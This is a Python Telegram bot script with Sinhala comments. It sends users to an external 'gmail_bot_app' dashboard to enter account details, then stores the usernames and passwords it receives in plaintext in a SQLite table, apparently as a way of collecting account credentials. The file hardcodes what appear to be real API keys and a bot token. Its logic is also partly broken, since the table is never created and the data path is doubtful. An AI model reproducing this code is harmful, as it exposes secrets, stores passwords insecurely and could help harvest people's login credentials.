from telethon import TelegramClient, events, Button
import sqlite3
import json

# API විස්තර
API_ID = 27361394
API_HASH = 'b021841f18b1effa52bf577dd5bc6084'
BOT_TOKEN = '8965559029:AAGuJ2_T_a166EqspZtLYJiiEB_WwgVzgXQ'

bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 1. /start කමාන්ඩ් එක
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply("සාදරයෙන් පිළිගනිමු! ගිණුම් තොරතුරු ඇතුළත් කිරීමට බොත්තම ඔබන්න.", 
                      buttons=[Button.url("Open Dashboard", url='https://nikka305.github.io/gmail_bot_app/')])

# 2. Web App එකෙන් දත්ත ලැබෙන විට (Callback හරහා)
@bot.on(events.CallbackQuery)
async def handler(event):
    try:
        # දත්ත JSON ලෙස ලැබෙන නිසා එය පරිවර්තනය කිරීම
        data = json.loads(event.data)
        username = data.get('username')
        password = data.get('password')
        
        # Database එකට දත්ත ඇතුල් කිරීම
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        conn.close()
        
        await event.respond(f"✅ දත්ත සාර්ථකව ලැබුණා! \nUsername: {username}")
    except Exception as e:
        print(f"Error: {e}")

print("🚀 බොට් සාර්ථකව ක්‍රියාත්මකයි...")
bot.run_until_disconnected()